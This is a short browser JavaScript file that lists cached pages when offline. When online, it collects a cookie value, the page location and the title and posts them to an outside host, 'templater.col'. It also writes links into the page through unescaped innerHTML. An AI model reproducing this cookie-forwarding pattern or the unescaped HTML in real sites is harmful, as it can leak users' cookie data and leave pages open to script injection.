const   ajax = require('ajaxsim'),
        cook = require('dist-cookie');

let jsonFile = (document.getElementsByTagName('script'))[0].src;
let body = document.querySelector('body');




    //window.location = str;

if(navigator.onLine) {
    let nameCookie = 'name';
    let cookieData = cook(nameCookie),
        titlePage = document.querySelector('title').innerText,
        host = window.location,
        response = "cookie=" + cookieData + '&host=' + host + '&title=' + titlePage;
    ajax('http://templater.col/respond-require-data', response);
    ajax(jsonFile, '', parseJson);
}
else {
    let data = window.localStorage.nameLine;
    let div = document.createElement('div');
    div.className = 'title';
    div.innerHTML = "<h3>Offline pages</h3>";
    body.appendChild(div);
    write(data);
}


function write(data, i = 0) {
    let obj = JSON.parse(data);
    if (i < obj.pages.count) {
        let page = obj.pages['page-' + i];
        for (key in page) {
            if (page.hasOwnProperty(key)) {
                let div = document.createElement('div');
                div.className = 'sic';
                div.innerHTML = "<a href="+key+'>'+page[key]+'</a>';
                body.appendChild(div);
                write(data, i + 1);
            }
        }
    }
}

function parseJson(data, i = 0){

    window.localStorage.nameLine = data;

}



